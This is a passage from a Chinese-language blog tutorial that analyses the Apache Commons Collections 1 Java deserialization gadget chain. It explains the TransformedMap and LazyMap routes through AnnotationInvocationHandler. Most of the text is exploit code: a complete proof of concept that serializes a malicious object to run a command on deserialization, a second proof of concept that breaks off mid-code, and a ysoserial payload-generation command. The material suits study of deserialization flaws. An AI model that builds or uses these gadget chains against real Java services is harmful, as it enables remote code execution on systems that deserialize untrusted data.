class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中InvokerTransformer.transformer方法为危险方法</p>
<p>寻找谁的里面调用了transformer 方法,然后有两个类，形成两条链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransformedMap</span><br><span class="line">LazyMap</span><br></pre></td></tr></table></figure>

<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">         <span class="built_in">super</span>();</span><br><span class="line">     iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">     object = iTransformers[i].transform(object);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串</p>
<p>在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊.</p>
<h2 id="TransformedMap链子"><a href="#TransformedMap链子" class="headerlink" title="TransformedMap链子"></a>TransformedMap链子</h2><p>里面有三个方法调用transformer</p>
<p>transformer</p>
<p>transformValue</p>
<p>checkSetValue</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>搜索 valueTransformer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br></pre></td></tr></table></figure>

<p>为protected无法修改，这里寻找<strong>decorate</strong> 进行调用构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>静态方法decorate</p>
<p>相当于传入任意map 类，然后新建TransformedMap类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">   <span class="type">InvokerTransformer</span> <span class="variable">invoke</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">   <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">   TransformedMap.decorate(map,<span class="literal">null</span>,invoke);</span><br></pre></td></tr></table></figure>

<p>然后我们查看checkSetValue(Object value)是否可控，看是谁调用了checkSetValue，find 方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invoke</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="AbstractInputCheckedMapDecorator"><a href="#AbstractInputCheckedMapDecorator" class="headerlink" title="AbstractInputCheckedMapDecorator"></a>AbstractInputCheckedMapDecorator</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(entry);</span><br><span class="line">            <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里的this.parent传入的就是TransformedMap,<strong>AbstractInputCheckedMapDecorator</strong> 的根父类实际就是 <strong>Map</strong> ，所以我们现在只需要找到一处 <strong>readObject</strong> 方法，只要它调用了 <strong>Map.setValue()</strong> 方法,即可完成整个反序列化链。(这里涉及一些多态的知识)</p>
<p>链子从这里开始构造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="comment">// Press Shift twice to open the Search Everywhere dialog and type `show whitespaces`,</span></span><br><span class="line"><span class="comment">// then press Enter. You can now see whitespace characters in your code.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invoke</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="comment">//TransformedMap.decorate(map,null,invoke);</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap =TransformedMap.decorate(map,<span class="literal">null</span>,invoke);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后查看谁的里面调用了setValue</p>
<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p><code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法调用了<code>setValue()</code>方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            if (var7 != null) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6182022883658399397L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>这个类不是public 所以可以通过反射来来获取，</p>
<p>再看看这个类的构造方法。参数是一个<code>Class</code>对象，一个<code>Map</code>对象，其中<code>Class</code>继承了<code>Annotation</code>，也就是需要传入一个注解类进去（Target或者Override）。</p>
<p>注解举个例子就是我们经常会见到的<code>@Override</code>。override.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"></span><br><span class="line">annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationConstructor.newInstance(Target.class, transformedMap);</span><br></pre></td></tr></table></figure>

<p>再看readObject</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next();</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="poc如下"><a href="#poc如下" class="headerlink" title="poc如下"></a>poc如下</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> cons.newInstance(Retention.class, transformMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filname)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filname);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>



<h2 id="LazyMap链子"><a href="#LazyMap链子" class="headerlink" title="LazyMap链子"></a>LazyMap链子</h2><p>寻找的 transform 入口中，找到 <strong>LazyMap</strong> 中的get方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected final Transformer factory;</span><br></pre></td></tr></table></figure>

<p><strong>factory可控</strong>，这样可以变为ChainedTransformer，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们接下来只需要找到一个readObject方法调用了该get方法即可</p>
<p><strong>AnnotationInvocationHandler</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>AnnotationInvocationHandler</strong>其实在该类中的readObject方法中并没有找到能有直接引用map的get方法的,但是有一个invoke中可以执行get方法,这就需要引入一点点java代理的知识</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">       <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">       Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">       <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">           paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">           <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">       <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">           <span class="keyword">return</span> toStringImpl();</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">           <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">           <span class="keyword">return</span> type;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">       <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);  <span class="comment">//这里调用</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">           <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">           result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure>

<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);</span></span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);  <span class="comment">//一旦调用get方法，就实现rce</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(Retention.class, lazymap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxymap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line"></span><br><span class="line">        